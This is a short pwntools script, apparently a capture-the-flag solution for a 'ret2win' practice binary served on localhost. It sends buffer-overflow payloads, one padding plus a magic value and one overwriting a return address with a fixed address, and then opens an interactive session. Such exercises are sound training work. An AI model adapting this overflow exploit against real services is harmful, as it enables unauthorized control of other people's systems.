from pwn import *
#p = process("./ret2win")
p = remote("localhost", 31337)
p.recv()
payload = ("A" * 20).encode("utf-8") + p64(0xbaddecafbeefcafe)
print(payload)
p.sendline(payload)
payload = ("B" * 0x28).encode("utf-8") + p64(0x0000000000400607) 
print(payload)
p.sendline(payload)
print(p.recv())
p.interactive()

